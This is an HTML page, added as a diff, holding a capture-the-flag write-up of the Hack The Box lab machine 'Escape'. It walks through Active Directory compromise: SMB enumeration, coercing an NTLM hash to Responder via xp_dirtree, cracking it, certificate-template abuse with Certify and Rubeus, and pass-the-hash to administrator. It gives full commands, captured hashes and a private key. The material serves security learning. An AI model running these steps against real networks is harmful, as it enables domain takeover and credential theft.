@@ -1,0 +1,521 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Escape</h1>
+    <p class="text">Difficulty : Medium | UserDifficulty : 4.4</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-07 17:51:15Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2025-11-07T17:52:46+00:00; +8h00m00s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-07T17:52:46+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.28.182:1433: 
+|     Target_Name: sequel
+|     NetBIOS_Domain_Name: sequel
+|     NetBIOS_Computer_Name: DC
+|     DNS_Domain_Name: sequel.htb
+|     DNS_Computer_Name: dc.sequel.htb
+|     DNS_Tree_Name: sequel.htb
+|_    Product_Version: 10.0.17763
+| ms-sql-info: 
+|   10.129.28.182:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_ssl-date: 2025-11-07T17:52:46+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-11-07T17:49:56
+|_Not valid after:  2055-11-07T17:49:56
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-07T17:52:46+00:00; +8h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
+| Not valid before: 2024-01-18T23:03:57
+|_Not valid after:  2074-01-05T23:03:57
+|_ssl-date: 2025-11-07T17:52:46+00:00; +8h00m00s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49690/tcp open  msrpc         Microsoft Windows RPC
+49702/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+49736/tcp open  msrpc         Microsoft Windows RPC</code></pre></div>
+
+
+
+
+<p class="text">We have tons of output, but we can focus on to port 445, and enumerat SMB shares.</p>
+<p class="text">Also, the namp result revealed valid domain name <u>sequel.htb</u>. Let's add this to /etc/hosts.</p>
+<div class="code-box"><pre><code>└─$ echo '$IP sequel.htb' | sudo tee -a /etc/hosts</code></pre></div>
+<p class="text">Then we can start enumeration.</p>
+<div class="code-box"><pre><code>└─$ crackmapexec smb 10.129.28.182 -u guest -p '' --shares
+SMB         10.129.28.182   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.129.28.182   445    DC               [+] sequel.htb\guest: 
+SMB         10.129.28.182   445    DC               [+] Enumerated shares
+SMB         10.129.28.182   445    DC               Share           Permissions     Remark
+SMB         10.129.28.182   445    DC               -----           -----------     ------
+SMB         10.129.28.182   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.28.182   445    DC               C$                              Default share
+SMB         10.129.28.182   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.28.182   445    DC               NETLOGON                        Logon server share 
+SMB         10.129.28.182   445    DC               Public          READ            
+SMB         10.129.28.182   445    DC               SYSVOL                          Logon server share </code></pre></div>
+
+<p class="text">Fortunately we have access to Public share.</p>
+
+<div class="code-box"><pre><code>└─$ smbclient //sequel.htb/Public                         
+Password for [WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sat Nov 19 06:51:25 2022
+  ..                                  D        0  Sat Nov 19 06:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
+
+                5184255 blocks of size 4096. 1465034 blocks available
+smb: \> get "SQL Server Procedures.pdf"</code></pre></div>
+
+
+<h2 class="subtitle">Foothold</h2>
+<div class="img">
+    <img src="{% static 'EthHack/images/escape/1.png' %}" alt="">
+    <p class="text">Opening installed pdf file, we can find public user's credential for MSSQL, which is open on port 1443. <br><br><u>PublicUser@GuestUserCantWrite1</u></p>
+</div>
+
+
+<p class="text">Let's logon to MSSQL.</p>
+
+<div class="code-box"><pre><code>└─$ impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.h
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'maste
+[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_eng
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (PublicUser  guest@master)></code></pre></div>
+
+<p class="text">We have two pieces of information : The target machine is hosting ActiveDirectory. : On the AD, running service would be run with SPN.</p>
+<p class="text">Therefore, we may be able to capture some hash or ticket if I can query my host. To get request, we can use a tool resopnder.</p>
+
+<div class="code-box"><pre><code>└─$ sudo responder -I tun0 -v                                
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+...
+
+
+
+
+SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\.10.16.38\test', 1, 1
+subdirectory   depth   file   
+------------   -----   ----   </code></pre></div>
+
+<p class="text">Then, the response came here.</p>
+
+<div class="code-box"><pre><code>└─$ sudo responder -I tun0 -v                                
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
+...
+
+[SMB] NTLMv2-SSP Client   : 10.129.28.182
+[SMB] NTLMv2-SSP Username : sequel\sql_svc
+[SMB] NTLMv2-SSP Hash     : <u>sql_svc::sequel:c163dac89ba2e80a:8B96FCC8D5727389C3C61E5F1B723CDB:010100000000000000325FC0A34FDC01082CF86900A2AC910000000002000800510038004F00580001001E00570049004E002D0057003500550059004400540035004C0042004900440004003400570049004E002D0057003500550059004400540035004C004200490044002E00510038004F0058002E004C004F00430041004C0003001400510038004F0058002E004C004F00430041004C0005001400510038004F0058002E004C004F00430041004C000700080000325FC0A34FDC01060004000200000008003000300000000000000000000000003000003E2F1F8E0AB12B197A5D27A36AE97C39D951E5997B57A032415BD7AF8E3620F60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330038000000000000000000</u>                                              
+[+] Exiting...</code></pre></div>
+
+<p class="text">Resopnder received hash of sql_svc user. When we get a hash, there is only one stuff we should do :</p>
+
+<div class="code-box"><pre><code>└─$ cat hash                                                               
+sql_svc::sequel:c163dac89ba2e80a:8B96FCC8D5727389C3C61E5F1B723CDB:010100000000000000325FC0A34FDC01082CF86900A2AC910000000002000800510038004F00580001001E00570049004E002D0057003500550059004400540035004C0042004900440004003400570049004E002D0057003500550059004400540035004C004200490044002E00510038004F0058002E004C004F00430041004C0003001400510038004F0058002E004C004F00430041004C0005001400510038004F0058002E004C004F00430041004C000700080000325FC0A34FDC01060004000200000008003000300000000000000000000000003000003E2F1F8E0AB12B197A5D27A36AE97C39D951E5997B57A032415BD7AF8E3620F60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330038000000000000000000
+
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+...
+sql_svc:<u>REGGIE1234ronnie</u></code></pre></div>
+
+<p class="text">We got password for sql_svc.</p>
+
+<div class="code-box"><pre><code>└─$ <u>evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'</u>
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents></code></pre></div>
+
+<p class="text">We got connection with the target machine.</p>
+
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\SQLServer\Logs> dir
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK</code></pre></div>
+
+<p class="text">Under the C:\SQLServer\Logs, I found backup file. We can install this file and analyze on our local machine.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK
+                                        
+Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
+                                        
+Info: Download successful!</code></pre></div>
+
+<p class="text">Let's raed this backup file.</p>
+<div class="code-box"><pre><code>└─$ iconv -f utf-16le -t utf-8 ERRORLOG.BAK | grep -i --color=auto password
+2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Logon failed for user '<u>NuclearMosquito3</u>'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</code></pre></div>
+<p class="text">There is a password like string NuclearMosquito3. The user may input password to username field mistakenly. Let's try this credential for new winrm connection.</p>
+
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\SQLServer\Logs> dir C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:58 AM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----         2/1/2023   6:37 PM                Ryan.Cooper
+d-----         2/7/2023   8:10 AM                sql_svc</code></pre></div>
+
+<p class="text">There is an user Ryan.Cooper. He would be the target.</p>
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> </code></pre></div>
+
+<p class="text">The password was Ryan's. We successfully compromised new user.</p>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">For AD privilege escalation, we always check Active Directory Certificate Services (ADCS). </p>
+<p class="text">With authenticated user credential, we can easily enumerate vulnerable ADCS using below command.</p>
+<div class="code-box"><pre><code>└─$ certipy-ad find -u 'ryan.cooper' -p 'NuclearMosquito3' -dc-ip 10.129.28.182 -vulnerable...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Saved BloodHound data to '20251107061428_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20251107061428_Certipy.txt'
+[*] Saved JSON output to '20251107061428_Certipy.json'</code></pre></div>
+<p class="text">There is vulnerable one for sequel-DC-CA.</p>
+
+
+<p class="text">We can analyze its vulnerable configuration with several method. This time I just read generated text file.</p>
+<div class="code-box"><pre><code>└─$ cat 20251107061428_Certipy.txt                                         
+Certificate Authorities
+  0 
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+...</code></pre></div>
+
+<p class="text">As the same, we can exploit this vulnerablity from our machine, but it's more flexible and stable to perform exploitation on the target machine.</p>
+<p class="text">For that purpose, we need to upload <u>Certify.exe</u> to the target machine.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> upload Certify.exe
+                                        
+Info: Uploading /home/kali/tempo/Certify.exe to C:\ProgramData\Certify.exe
+                                        
+Data: 232104 bytes of 232104 bytes copied
+                                        
+Info: Upload successful!</code></pre></div>
+
+<p class="text">Just in case, let's confirm that the output we got from certipy-ad was correct using this.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> .\Certify.exe cas
+*Evil-WinRM* PS C:\ProgramData> .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
+
+[*] Listing info about the Enterprise CA 'sequel-DC-CA'
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb\sequel-DC-CA
+    Template Name                         : UserAuthentication
+...</code></pre></div>
+
+<p class="text">The outputs are almost the same. Then we can exploit this vulnerability.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> <u>.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator</u>
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : sequel\Ryan.Cooper
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserAuthentication
+[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] AltName                 : administrator
+
+[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 14
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAtUZ+WXaIpX1EIOyQWjRw9A32WHcva28aXBCRsp1BEakIVBtd
+yRA0px6K6UuhfSp3JrjazOOxAjK+Zv0q6CtHRQabis7/Mn/di226GYiutvwokZ24
+cIN+8BUmM8RUEXd+rGfWzijgQIhcCg0JU1ti9Xk5Nh/dgqqcIkcj8WsQC8tyvlpK
+E40pbiPG4vcrgU+bSVwMs8tRLZsXq8MYqsfe9PgLz2aL9AQsoJWuJrSE2JORq46T
+yjdgnnOz+lqA7bmTznu3hl7cfiX5MmgJ7mMy7tPyrWZSYEBQ1t4Lvvhm8meO9a3Y
+a9LWYv/wotHSU2BiN2xexrdo5X7io0YO5TaP3QIDAQABAoIBAQCbZCFdKTn7uoTT
+QFaBrOCCpRFeRlTU4HmVH/L1TM4BiIeGKatcdtLby1fCor184REglWeiKTCMNNl4
+yV6lhKvkZMSi2cxzCp7sLZRQ3RT/8OoJ4UzAzkfbIBYOXCbAjlF9EspVET8isoFL
+cF9lIDqVOGQtnGUy5HNRAvCxu1gW8s9F/bi2Oi3CMzURt0/899fuoYycEDMfJL+4
+ObvovDaN0/8O29deYk4fvSsdM5Ig4r6QE5FYsSrJaV0iOOnpac22tGigI3v2RIe+
+XcExjJ5TiRvD8/4xGRbVIFEQ0XDzI4J3PQ+I0IzZbhp1IUsJndhuy6gIrS+GTMvF
+2ODmlQK1AoGBANgC2fdzMf7Q5bgy2hkX3o4a4WEOOgSWr+oW6oNCYIkDJA/88HuW
+H7aWcuKTFUwcBUYzFwg1Sduy8+8r644TGtXXxnhFyr+nz+GJmzUO0zWkQnSh0Y+V
+PqYtf1E1QON25w+2ARkZNyr9tJmGMYyZeiE79SKq5q9RskVTEo7jnCNPAoGBANbV
+c97F346buaI6+3K7y0Of8orPz4EKwTSV37I+/rDLbMRGTTlrJAW/yhQNRyijvopz
+qKznp8K1VeXYdCbn0WxC6poU6zP0kZ+LpckpKBpFsMTwzTAZGcp+r2qJfJgsKQn7
+yxoF5uskSCDR/rHBkbSgw/t1e/m3sArqpNpnOL8TAoGBAMuvHKLVb64sgoCHCtqg
+hE4RELY4+QI8qNIeG7H7lBV97bJZutV+QJcmFFyLfoiO33ZLVIt73BIbEyNSkcId
+R6+e0Fm2zbCc50tvOvfz67roEXXy5Cz0+OcvfZ8wjOgvxT8uSqjE+x1Br9sYC37d
+dakC5Wp0JiPo8CWoaJZuD1vHAoGAfys3PaWP4hDYX+neMlprxgoGPpko0dAV8hTN
+p+uWQ/0G02ByEg0T87tF2XzKpInZHoe8Ty2Jpr5ErJvmlakf1J//01mSqNya3wCB
+EISmUnbyXoHUVCZnl/BJ0hy0fjeVy20bGrpnqMV/VL45r+tPXsbTfCRdUMKlGLEx
+CH+VnbUCgYBNsmIdx+//7jHTjqNrHfBiT/Lg7naU5kEhlxRCGhX1vx35APpS3EOa
+N/0dZsFY4QTT9N4XRkLcGlCq7sYmL3zqKdc7JZPTF2DhU0r4w230NbkstqBSFKnf
+50LZGkxqlZsc0Idq6Jw1iEsLfsCL2Uey8P9+Dl32kjAdnYJz+J2Vrg==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAA5UG4DUDMEEugAAAAAADjANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMTA3MTgzNjMyWhcNMzUxMTA1
+MTgzNjMyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC1Rn5ZdoilfUQg7JBaNHD0DfZY
+dy9rbxpcEJGynUERqQhUG13JEDSnHorpS6F9KncmuNrM47ECMr5m/SroK0dFBpuK
+zv8yf92LbboZiK62/CiRnbhwg37wFSYzxFQRd36sZ9bOKOBAiFwKDQlTW2L1eTk2
+H92CqpwiRyPxaxALy3K+WkoTjSluI8bi9yuBT5tJXAyzy1Etmxerwxiqx970+AvP
+Zov0BCygla4mtITYk5GrjpPKN2Cec7P6WoDtuZPOe7eGXtx+JfkyaAnuYzLu0/Kt
+ZlJgQFDW3gu++GbyZ471rdhr0tZi//Ci0dJTYGI3bF7Gt2jlfuKjRg7lNo/dAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIHwXvkfQ1qFQV2paUzVfMtLOfs5
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEADbB5DQ0XpkVYoFlXCERqAc4fl6+3+0+4X3MiIK2ysivngn4oSv6ScukK
+Cb88n8+bpYar6C3OmgkGk78/atEX0PXor+nAc+hbN30KaGQNSNjh45J2KGzZsaqA
+XhYgn69RJCETtepW9eC310/DLC1cGMtAHcYVwTEOabDDMZ//awyTtrx7x1+gMGQt
+3X1W5Ts1uQj44LTyun3d2g0RFFM7fnwVLka8ZIv6ZUA7bOLttjguXqDB46NW6nja
+vq3DDfxjdbinPajiaq9Jd0Z2G4Dih3qsMKGQuLAbhvjmKqoXwlyKX1auepKUO1w1
+t9T2oztRATKcucdsZcwuKtutEZ4zYA==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></pre></div>
+
+<p class="text">There is a instruction to create pfx file at the last line. Copy and paste above output from -----BEGIN RSA PRIVATE KEY----- to -----END CERTIFICATE-----, and again copy and paste output command.</p>
+
+<div class="code-box"><pre><code>└─$ echo '-----BEGIN RSA PRI....' > cert.pem
+
+└─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+Enter Export Password:
+Verifying - Enter Export Password:
+<u class="green">※We don't need to enter password. Just press Enter key and leave them empty.</u></code></pre></div>
+<p class="text">We can use this pfx file to ask TGT to get NTLM hash. To do that, we need to upload Rubeus.exe and generated pfx file to the target machine.</p>
+
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> upload Rubeus.exe
+                                        
+Info: Uploading /home/kali/tempo/Rubeus.exe to C:\ProgramData\Rubeus.exe
+                                        
+Data: 623956 bytes of 623956 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\ProgramData> upload cert.pfx
+                                        
+Info: Uploading /home/kali/tempo/cert.pfx to C:\ProgramData\cert.pfx
+                                        
+Data: 4588 bytes of 4588 bytes copied
+                                        
+Info: Upload successful!</code></pre></div>
+
+
+<p class="text">Finally, we can request tgt with Rubeus.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\ProgramData> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.3
+....
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : <u>A52F78E4C751E5F5E17E1E9F3E58F4EE</u></code></pre></div>
+<p class="text">We got NTML hash for Admin user. Using this NTLM, let's perform PTH.</p>
+
+
+<div class="code-box"><pre><code>└─$ evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator</code></pre></div>
+
+
+<p class="text">We got admin user.</p>
+
+
+</body>
+</html>
